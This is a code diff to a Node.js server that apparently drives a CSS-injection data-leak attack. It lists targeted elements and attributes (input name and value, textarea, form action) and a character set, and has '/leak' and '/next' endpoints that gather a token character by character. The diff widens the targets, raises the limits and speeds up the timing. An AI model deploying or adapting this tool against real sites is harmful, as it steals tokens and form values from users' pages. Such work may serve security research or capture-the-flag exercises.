@@ -3,13 +3,11 @@ const url = require('url');
 const port = 5001;
 
 const HOSTNAME = "http://localhost:5001";
-const ELEMENTS = ["input"];
-//const ELEMENTS = ["input","textarea","form"];
-//const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"]};
-const ATTRIBUTES = {__proto__:null,"input":["name","value"]};
-const MAX_ELEMENTS = 1;
-const MAX_VALUE = 10;
-const WAIT_TIME_MS = 1000;
+const ELEMENTS = ["input","textarea","form"];
+const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"]};
+const MAX_ELEMENTS = 4;
+const MAX_VALUE = 50;
+const WAIT_TIME_MS = 250;
 
 const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126).split('');
 
@@ -47,11 +45,11 @@ const requestHandler = (request, response) => {
                     }
                 }
             }
-            console.log('\tleak: waiting others...');   
+            //console.log('\tleak: waiting others...');   
         break;
         case "/next":
             pending.push(response);            
-            console.log('\tquery: waiting others...');
+            //console.log('\tquery: waiting others...');
             setTimeout(x=>{            
                 if(pending.length) {
                     if(foundToken) {
